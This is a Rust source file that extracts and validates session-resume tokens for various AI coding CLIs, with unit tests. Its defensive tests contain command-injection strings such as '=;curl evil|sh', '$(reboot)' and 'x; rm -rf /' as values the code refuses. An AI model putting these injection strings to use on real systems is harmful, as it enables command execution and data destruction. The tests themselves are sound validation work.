pub(crate) fn trailing_uuid(s: &str) -> Option<String> {
    if s.len() < 36 {
        return None;
    }
    let tail = &s[s.len() - 36..];
    Uuid::parse_str(tail).ok().map(|u| u.to_string())
}

fn codex_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // `codex resume <UUID>` / `codex exec resume <UUID>` (never captures
    // `resume --last`: the UUID parse rejects it).
    for seq in [&["resume"][..], &["exec", "resume"][..]] {
        if let Some(tok) = argv_after_subcommand(argv, seq) {
            if Uuid::parse_str(&tok).is_ok() {
                return (Some(tok), CliConfidence::Explicit);
            }
        }
    }
    // `-c experimental_resume=<path-to-rollout-…-<uuid>.jsonl>`
    if let Some(path) = argv
        .iter()
        .find_map(|a| a.trim_matches('"').strip_prefix("experimental_resume="))
    {
        if let Some(id) = Path::new(path)
            .file_stem()
            .and_then(|s| s.to_str())
            .and_then(trailing_uuid)
        {
            return (Some(id), CliConfidence::Explicit);
        }
    }
    // Bare launch: rollout files are GLOBAL (~/.codex/sessions/YYYY/MM/DD/) —
    // only a unique birth-time match discriminates between terminals.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".codex").join("sessions"), Some("jsonl"), 3);
    let (stem, conf) = birth_correlate(&entries, start_ft);
    match stem.as_deref().and_then(trailing_uuid) {
        Some(id) => (Some(id), conf),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn copilot_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(t) = flag_token(argv, &["--resume", "-r"]) {
        return (Some(t), CliConfidence::Explicit);
    }
    // Bare: per-session dirs named by id under a GLOBAL root.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".copilot").join("session-state"), None, 0);
    birth_correlate(&entries, start_ft)
}

fn qwen_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(t) = flag_token(argv, &["--resume", "--session-id"]) {
        return (Some(t), CliConfidence::Explicit);
    }
    // Per-project chats (~/.qwen/projects/<sanitized>/chats/<id>.jsonl) — the
    // sanitize scheme is qwen's, not ours to guess, so scan all projects and
    // trust only a unique birth-time match.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".qwen").join("projects"), Some("jsonl"), 2);
    birth_correlate(&entries, start_ft)
}

fn goose_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Sessions live in one global SQLite DB: mtime/birth correlation cannot
    // discriminate sessions — argv-Explicit only.
    match flag_token(argv, &["--session-id", "-n", "--name"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn opencode_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Global SQLite DB — argv-Explicit only (see goose).
    match flag_token(argv, &["-s", "--session"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn crush_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // TRAP: `-C` (capital) is continue-last and `-c` is --cwd — neither carries
    // a session id. Only `-s/--session <id>` is an identity.
    match flag_token(argv, &["-s", "--session"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn devin_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Local session storage undocumented — argv-Explicit only.
    match flag_token(argv, &["-r", "--resume"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn cursor_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Cloud-synced, on-disk format unstable — argv-Explicit only
    // (argv_flag_value already handles the `--resume=<id>` form).
    match flag_token(argv, &["--resume"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn amp_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Threads are cloud-only; identity exists solely in argv (`T-…` tokens).
    for seq in [&["threads", "continue"][..], &["threads", "fork"][..]] {
        if let Some(tok) = argv_after_subcommand(argv, seq) {
            if tok.starts_with("T-") && safe_resume_token(&tok) {
                return (Some(tok), CliConfidence::Explicit);
            }
        }
    }
    (None, CliConfidence::Ambiguous)
}

fn cline_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Storage layout undocumented — argv-Explicit only.
    match flag_token(argv, &["--id"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn gemini_extract(
    _argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // No exact-id resume exists; restore is `gemini --resume` = continue the
    // last session in this cwd, which is exactly what one gemini per dir means.
    (None, CliConfidence::Correlated)
}

fn aider_extract(
    _argv: &[String],
    cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // No session ids; history is a fixed per-cwd file. Present → resumable in
    // place; absent → nothing to restore.
    if cwd.join(".aider.chat.history.md").is_file() {
        (None, CliConfidence::Correlated)
    } else {
        (None, CliConfidence::Ambiguous)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(v: &[&str]) -> Vec<String> {
        v.iter().map(|x| x.to_string()).collect()
    }

    /// Bug D: the nested-shell classifier truth table (§4.1 of the research
    /// doc) — both directions. The table is deliberately conservative: a
    /// false negative degrades to the Busy row, never a wrong statement.
    /// (Moved verbatim from gui::composer with the classifier body — F1.)
    #[test]
    fn nested_shell_cmd_truth_table() {
        // Shell spawners — the honest raw-shell lane.
        for cmd in [
            "sudo su",
            "sudo su -",
            "sudo su - root",
            "sudo -i",
            "sudo -s",
            "sudo --login",
            "sudo bash",
            "sudo -u root bash",
            "sudo -E -H zsh",
            "sudo -- su -",
            "su",
            "su -",
            "su - root",
            "su root",
            "login",
            "bash",
            "bash -l",
            "bash -i",
            "zsh -l",
            "sh",
            "dash",
            "fish",
            "ksh",
            "/usr/bin/bash",
            "/bin/su -",
            "  bash  ",
        ] {
            assert!(nested_shell_cmd(cmd), "{cmd:?} must classify nested");
        }
        // Finite commands / lookalikes — today's Busy row stays.
        for cmd in [
            "sudo apt install x",
            "sudo systemctl restart nginx",
            "sudo vim /etc/sudoers",
            "sudo",
            "suite",
            "visudo",
            "sushi",
            "bashful",
            "echo bash",
            "ssh host uptime",
            "ssh devbox",
            "bash -c 'sleep 5'",
            "sh -c ls",
            "bash script.sh",
            "bash -",
            "su -c whoami root",
            "sudo bash -c 'apt update'",
            "cat",
            "python3",
            "",
        ] {
            assert!(!nested_shell_cmd(cmd), "{cmd:?} must NOT classify nested");
        }
    }

    fn chain(cmds: &[&str], cli_cwd: Option<&str>) -> crate::state::NestedChain {
        crate::state::NestedChain {
            cmds: s(cmds),
            entered_cwd: PathBuf::from("/home/dev"),
            cli_cwd: cli_cwd.map(PathBuf::from),
            opened_ms: 1,
        }
    }

    fn nested_cli(adapter: &str, token: Option<&str>) -> InnerCli {
        InnerCli {
            adapter: adapter.into(),
            resume_token: token.map(str::to_string),
            confidence: CliConfidence::Explicit,
            cwd: PathBuf::from("/"),
            nested: true,
        }
    }

    /// The pre-F2 (manual) wording — `auto = false` keeps every golden below
    /// byte-exact.
    fn nested_restore_notice_f(
        chain: &crate::state::NestedChain,
        cli: Option<&InnerCli>,
    ) -> String {
        nested_restore_notice(chain, cli, false)
    }

    /// F2 goldens — the `auto = true` variants: the chain announces itself
    /// as auto-typed; the inner-CLI resume hint stays manual and verbatim
    /// (I1 unchanged); every escaping choke point is shared with the manual
    /// variants (one composition function).
    #[test]
    fn nested_restore_notice_auto_golden() {
        let cli = nested_cli("claude", Some("xyz"));
        // Auto variant A.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], Some("/")), Some(&cli), true),
            "── re-establishing this terminal's nested shell (sudo su) automatically; its claude session was not auto-resumed — resume: cd '/'; claude --resume xyz ──"
        );
        // Auto variant B.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], None), Some(&cli), true),
            "── re-establishing this terminal's nested shell (sudo su) automatically; its claude session was not auto-resumed — resume: claude --resume xyz (run it from the conversation's directory) ──"
        );
        // Auto variant C.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], None), None, true),
            "── re-establishing this terminal's nested shell (sudo su) automatically; anything that ran inside it was not restored ──"
        );
        // The unsafe-token choke point degrades to auto-C — never a mangled
        // command, exactly like the manual lane.
        let evil = nested_cli("claude", Some("x; rm -rf /"));
        let n = nested_restore_notice(&chain(&["sudo su"], Some("/")), Some(&evil), true);
        assert!(
            n.contains("anything that ran inside it was not restored") && !n.contains("rm -rf"),
            "unsafe token must degrade to auto variant C: {n}"
        );
    }

    /// F1 spec §4.3 goldens — byte-exact variants A/B/C, the escaping choke
    /// points, and the truncation degradations.
    #[test]
    fn nested_restore_notice_golden() {
        // Variant A — the user's exact scenario from the investigation.
        let cli = nested_cli("claude", Some("xyz"));
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; cd '/'; claude --resume xyz ──"
        );
        // A with a quote-bearing witnessed cwd: sh_single_quote escaping.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/a'b")), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; cd '/a'\\''b'; claude --resume xyz ──"
        );
        // Variant B — identity but no beacon-witnessed cwd.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], None), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; claude --resume xyz (run it from the conversation's directory) ──"
        );
        // B via cd-truncation: a >120-char quoted path drops the cd.
        let long = format!("/{}", "x".repeat(130));
        let n = nested_restore_notice_f(&chain(&["sudo su"], Some(&long)), Some(&cli));
        assert!(n.ends_with("claude --resume xyz (run it from the conversation's directory) ──"));
        assert!(!n.contains("cd '"), "over-long witnessed cwd must drop the cd: {n}");
        // Variant C — no identity at all.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], None), None),
            "── this terminal had a nested shell (sudo su); anything running inside it was not restored — re-establish it manually ──"
        );
        // C — identity without a token.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&nested_cli("claude", None))),
            "── this terminal had a nested shell (sudo su); anything running inside it was not restored — re-establish it manually ──"
        );
        // C — an UNSAFE token never prints (r3-S1 choke point).
        let evil = nested_cli("claude", Some("x; rm -rf /"));
        let n = nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&evil));
        assert!(
            n.contains("re-establish it manually") && !n.contains("rm -rf"),
            "unsafe token must degrade to variant C: {n}"
        );
        // Multi-hop chain joins in order; control bytes are stripped.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su", "su - \x1b[31mdeploy"], None), None),
            "── this terminal had a nested shell (sudo su; su - [31mdeploy); anything running inside it was not restored — re-establish it manually ──"
        );
        // Empty chain reads "nested shell"; 100-char chain truncation is
        // char-safe and marked.
        assert_eq!(
            nested_restore_notice_f(&chain(&[], None), None),
            "── this terminal had a nested shell (nested shell); anything running inside it was not restored — re-establish it manually ──"
        );
        let huge = "sudo su -- very long command ".repeat(10);
        let n = nested_restore_notice_f(&chain(&[&huge], None), None);
        assert!(n.contains('…'), "over-long chain must truncate: {n}");
        assert!(n.chars().count() < 250);
    }

    /// F1 spec I1 regression table: only a confident NON-nested identity may
    /// ever feed auto-resume composition — `nested: true` loses regardless
    /// of confidence.
    #[test]
    fn nested_inner_cli_never_resumes() {
        for conf in [
            CliConfidence::Explicit,
            CliConfidence::Correlated,
            CliConfidence::Ambiguous,
        ] {
            for nested in [false, true] {
                let cli = InnerCli {
                    adapter: "claude".into(),
                    resume_token: Some(Uuid::new_v4().to_string()),
                    confidence: conf,
                    cwd: PathBuf::from("/"),
                    nested,
                };
                let want = !nested && !matches!(conf, CliConfidence::Ambiguous);
                assert_eq!(
                    cli_wants_resume(&cli),
                    want,
                    "confidence {conf:?} nested {nested}"
                );
            }
        }
    }

    /// F1 spec §2.4: chain append cap + consecutive dedupe.
    #[test]
    fn nested_chain_cap_and_dedupe() {
        let mut cmds = s(&["sudo su"]);
        assert!(!append_nested_cmd(&mut cmds, "sudo su"), "consecutive dupe");
        assert!(!append_nested_cmd(&mut cmds, "  sudo su  "), "trimmed dupe");
        assert!(append_nested_cmd(&mut cmds, "su - deploy"));
        assert!(append_nested_cmd(&mut cmds, "sudo su"), "non-consecutive repeat is a real hop");
        assert!(!append_nested_cmd(&mut cmds, ""), "empty never records");
        for i in cmds.len()..NESTED_CHAIN_MAX {
            assert!(append_nested_cmd(&mut cmds, &format!("bash -l # {i}")));
        }
        assert_eq!(cmds.len(), NESTED_CHAIN_MAX);
        assert!(!append_nested_cmd(&mut cmds, "zsh"), "cap holds");
        assert_eq!(cmds.len(), NESTED_CHAIN_MAX);
    }

    /// Bug 1 (claude wake): the session-id re-pin evidence rules. Uses real
    /// files in a temp dir — created()/modified() are the exact witnesses
    /// the production path reads.
    #[test]
    fn claude_repin_evidence_rules() {
        use std::time::{Duration, SystemTime};
        let ms = |t: SystemTime| {
            t.duration_since(SystemTime::UNIX_EPOCH).unwrap().as_millis() as u64
        };
        let dir = std::env::temp_dir().join(format!("tc_repin_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let pinned = Uuid::new_v4();
        let rotated = Uuid::new_v4();
        let now = SystemTime::now();
        let window = (ms(now) - 60_000, ms(now) + 60_000);

        // No files at all: abstain.
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // One rotated jsonl born inside the window, pinned ABSENT: re-pin.
        std::fs::write(dir.join(format!("{rotated}.jsonl")), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            Some(rotated)
        );

        // Pinned present and FRESH (written during the run): keep the pin.
        std::fs::write(dir.join(format!("{pinned}.jsonl")), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // Pinned present but STALE (fork-on-resume: the old transcript froze
        // before this run) + exactly one in-window birth: re-pin.
        let f = std::fs::OpenOptions::new()
            .write(true)
            .open(dir.join(format!("{pinned}.jsonl")))
            .unwrap();
        f.set_modified(now - Duration::from_secs(3600)).unwrap();
        drop(f);
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            Some(rotated)
        );

        // A second in-window candidate: ambiguous, abstain (never guess).
        std::fs::write(dir.join(format!("{}.jsonl", Uuid::new_v4())), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // A window that excludes every birth: abstain even with one file.
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn extracts_explicit_ids() {
        let u = Uuid::new_v4();
        assert_eq!(parse_claude_session(&s(&["claude", "--resume", &u.to_string()])), Some(u));
        assert_eq!(parse_claude_session(&s(&["claude", "--session-id", &u.to_string()])), Some(u));
        assert_eq!(parse_claude_session(&s(&["claude", &format!("--resume={u}")])), Some(u));
    }

    #[test]
    fn rejects_non_ids() {
        assert_eq!(parse_claude_session(&s(&["claude"])), None);
        assert_eq!(parse_claude_session(&s(&["claude", "--resume", "garbage"])), None);
    }

    #[test]
    fn explicit_argv_wins() {
        let u = Uuid::new_v4();
        let (tok, conf) = claude_extract(&s(&["claude", "--resume", &u.to_string()]), Path::new("C:\\x"), None);
        assert_eq!(tok, Some(u.to_string()));
        assert_eq!(conf, CliConfidence::Explicit);
    }

    #[test]
    fn codex_explicit_forms() {
        let u = Uuid::new_v4().to_string();
        let p = Path::new("C:\\x");
        assert_eq!(
            codex_extract(&s(&["codex", "resume", &u]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        assert_eq!(
            codex_extract(&s(&["codex", "exec", "resume", &u]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        let rollout = format!("experimental_resume=C:\\u\\.codex\\sessions\\2026\\07\\01\\rollout-2026-07-01T10-00-00-{u}.jsonl");
        assert_eq!(
            codex_extract(&s(&["codex", "-c", &rollout]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        // `resume --last` must NOT be captured as an id.
        let (tok, _) = codex_extract(&s(&["codex", "resume", "--last"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn amp_thread_forms() {
        let p = Path::new("C:\\x");
        assert_eq!(
            amp_extract(&s(&["amp", "threads", "continue", "T-abc123"]), p, None),
            (Some("T-abc123".into()), CliConfidence::Explicit)
        );
        assert_eq!(
            amp_extract(&s(&["amp", "threads", "fork", "T-zz"]), p, None),
            (Some("T-zz".into()), CliConfidence::Explicit)
        );
        // A non-T token after `threads continue` is not an identity.
        let (tok, _) = amp_extract(&s(&["amp", "threads", "continue", "nope"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn crush_flag_trap() {
        let p = Path::new("C:\\x");
        assert_eq!(
            crush_extract(&s(&["crush", "-s", "sess1"]), p, None),
            (Some("sess1".into()), CliConfidence::Explicit)
        );
        // -C (continue-last) and -c (cwd) carry no session identity.
        let (tok, conf) = crush_extract(&s(&["crush", "-C"]), p, None);
        assert_eq!((tok, conf), (None, CliConfidence::Ambiguous));
        let (tok, _) = crush_extract(&s(&["crush", "-c", "C:\\proj"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn cursor_equals_form() {
        let p = Path::new("C:\\x");
        assert_eq!(
            cursor_extract(&s(&["cursor-agent", "--resume=chat42"]), p, None),
            (Some("chat42".into()), CliConfidence::Explicit)
        );
        assert_eq!(
            cursor_extract(&s(&["cursor-agent", "--resume", "chat42"]), p, None),
            (Some("chat42".into()), CliConfidence::Explicit)
        );
    }

    #[test]
    fn explicit_only_adapters() {
        let p = Path::new("C:\\x");
        assert_eq!(
            copilot_extract(&s(&["copilot", "-r", "sid"]), p, None).0,
            Some("sid".into())
        );
        assert_eq!(
            qwen_extract(&s(&["qwen", "--session-id", "q1"]), p, None).0,
            Some("q1".into())
        );
        assert_eq!(
            goose_extract(&s(&["goose", "session", "--session-id", "20260702_1"]), p, None).0,
            Some("20260702_1".into())
        );
        assert_eq!(
            opencode_extract(&s(&["opencode", "--session", "oc1"]), p, None).0,
            Some("oc1".into())
        );
        assert_eq!(
            cline_extract(&s(&["cline", "--id", "c1"]), p, None).0,
            Some("c1".into())
        );
        assert_eq!(
            devin_extract(&s(&["devin", "-r", "brisk-otter"]), p, None).0,
            Some("brisk-otter".into())
        );
        // Missing value must not swallow the next flag.
        assert_eq!(cline_extract(&s(&["cline", "--id", "--verbose"]), p, None).0, None);
    }

    #[test]
    fn matcher_runtime_argv() {
        let m = Match::RuntimeArgv { runtimes: NODE_RT, needle: "gemini" };
        assert!(m.matches("node", &s(&["node", "C:\\nvm\\v22\\node_modules\\@google\\gemini-cli\\dist\\index.js"])));
        assert!(m.matches("node", &s(&["node", "C:\\Users\\z\\AppData\\Roaming\\npm\\node_modules\\.bin\\gemini"])));
        assert!(!m.matches("node", &s(&["node", "server.js"])));
        assert!(!m.matches("gemini", &s(&["gemini"]))); // stem not in runtimes for RuntimeArgv
        let e = Match::Either { stems: &["amp"], runtimes: NODE_RT, needle: "amp" };
        assert!(e.matches("amp", &s(&["amp", "threads", "continue", "T-1"])));
        // "examples/…" must not fuzzy-match "amp".
        assert!(!e.matches("node", &s(&["node", "examples\\demo.js"])));
    }

    /// U6: hook-based cmdline analysis — explicit ids, subcommand forms,
    /// quoted paths, bare launches degrade to Ambiguous, non-adapters None.
    #[test]
    fn analyze_cmdline_forms() {
        let cwd = Path::new("/home/z/proj");
        let u = Uuid::new_v4().to_string();

        let cli = analyze_cmdline(&format!("claude --resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.resume_token.as_deref(), Some(u.as_str()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);
        assert_eq!(cli.cwd, cwd);

        let cli = analyze_cmdline(&format!("claude --resume={u}"), cwd).unwrap();
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        let cli = analyze_cmdline(&format!("codex resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "codex");
        assert_eq!(cli.resume_token.as_deref(), Some(u.as_str()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        // Quoted path to the binary still resolves the stem.
        let cli = analyze_cmdline(&format!("'/usr/local/bin/claude' --resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        // Bare launch: a candidate with Ambiguous confidence (no local
        // filesystem to correlate against until §7.3), never a guess.
        let cli = analyze_cmdline("claude", cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.resume_token, None);
        assert_eq!(cli.confidence, CliConfidence::Ambiguous);

        // Non-adapters and empty lines yield nothing.
        assert!(analyze_cmdline("git status", cwd).is_none());
        assert!(analyze_cmdline("echo claude", cwd).is_none());
        assert!(analyze_cmdline("", cwd).is_none());
        assert!(analyze_cmdline("   ", cwd).is_none());
        // Disabled adapters stay off through this path too.
        assert!(analyze_cmdline("aider", cwd).is_none());
    }

    /// D11 (remote-cli-resume-spec): a colliding LOCAL store — a real dir
    /// under the local ~/.claude/projects named like the munge of a REMOTE
    /// posix cwd — must never mint a token through the remote analysis
    /// path, even though the raw extract fn would happily correlate it.
    #[test]
    fn d11_remote_analysis_never_mints_local_fs_tokens() {
        let Some(home) = dirs::home_dir() else {
            return; // no home, no hazard to stage
        };
        let cwd = format!("/tmp/tc-d11-{}", std::process::id());
        let munged = claude_project_dir_name(Path::new(&cwd));
        let dir = home.join(".claude").join("projects").join(&munged);
        std::fs::create_dir_all(&dir).unwrap();
        let u = Uuid::new_v4();
        std::fs::write(dir.join(format!("{u}.jsonl")), b"x").unwrap();
        // Sanity: the raw extract WOULD correlate from the staged local
        // store (the exact D11 hazard).
        let (tok, conf) = claude_extract(&s(&["claude"]), Path::new(&cwd), None);
        assert_eq!(tok, Some(u.to_string()));
        assert_eq!(conf, CliConfidence::Correlated);
        // The remote/hook analysis sanitizes it: Explicit-or-nothing.
        let cli = analyze_cmdline("claude", Path::new(&cwd)).unwrap();
        assert_eq!(cli.resume_token, None);
        assert_eq!(cli.confidence, CliConfidence::Ambiguous);
        // Explicit argv still passes through untouched.
        let cli = analyze_cmdline(&format!("claude --resume {u}"), Path::new(&cwd)).unwrap();
        assert_eq!(cli.resume_token, Some(u.to_string()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn split_cmdline_quoting() {
        assert_eq!(
            split_cmdline("claude --resume abc"),
            vec!["claude", "--resume", "abc"]
        );
        assert_eq!(
            split_cmdline("'/opt/a b/claude' -x \"two words\""),
            vec!["/opt/a b/claude", "-x", "two words"]
        );
        assert_eq!(split_cmdline("a\\ b c"), vec!["a b", "c"]);
        assert_eq!(split_cmdline("  "), Vec::<String>::new());
        assert_eq!(split_cmdline("''"), vec![""]);
    }

    #[test]
    fn restore_templates() {
        assert_eq!(
            restore_trailing("codex", Some("u-1")),
            Some("codex resume u-1".into())
        );
        assert_eq!(
            restore_trailing("goose", Some("20260702_1")),
            Some("goose session --resume --session-id 20260702_1".into())
        );
        assert_eq!(restore_trailing("gemini", None), Some("gemini --resume".into()));
        assert_eq!(
            restore_trailing("aider", None),
            Some("aider --restore-chat-history".into())
        );
        assert_eq!(restore_trailing("codex", None), None);
        assert_eq!(restore_trailing("unknown", Some("x")), None);
    }

    /// r3-S1: hostile tokens must die at capture (`flag_token`) AND at the
    /// restore choke point (`restore_trailing`) — the trailings' `'`-refusal
    /// does not stop any of these, and the token is spliced unquoted.
    #[test]
    fn hostile_resume_tokens_refused() {
        for bad in [
            "=;curl evil|sh",
            "$(reboot)",
            "`reboot`",
            "a b",
            "x\ny",
            "tok'en",
            "cmd&calc",
            "a\"b",
            "<x>",
            "-r",
            "",
        ] {
            assert!(!safe_resume_token(bad), "{bad:?} accepted");
            assert_eq!(restore_trailing("goose", Some(bad)), None, "{bad:?} spliced");
            assert_eq!(
                flag_token(&s(&["goose", "--session-id", bad]), &["--session-id"]),
                None,
                "{bad:?} captured"
            );
        }
        assert!(!safe_resume_token(&"a".repeat(129)), "length cap");
        // Every real token shape stays accepted end-to-end.
        for ok in [
            "0e3a3f2a-6f2b-4d0c-9e3e-8f6d2b1c0a9e",
            "T-abc123",
            "20260702_1",
            "rollout-2026.07.02:x@y",
        ] {
            assert!(safe_resume_token(ok), "{ok:?} refused");
            assert_eq!(
                flag_token(&s(&["goose", "--session-id", ok]), &["--session-id"]),
                Some(ok.to_string())
            );
        }
        assert!(restore_trailing("goose", Some("sess_1")).is_some());
    }
}
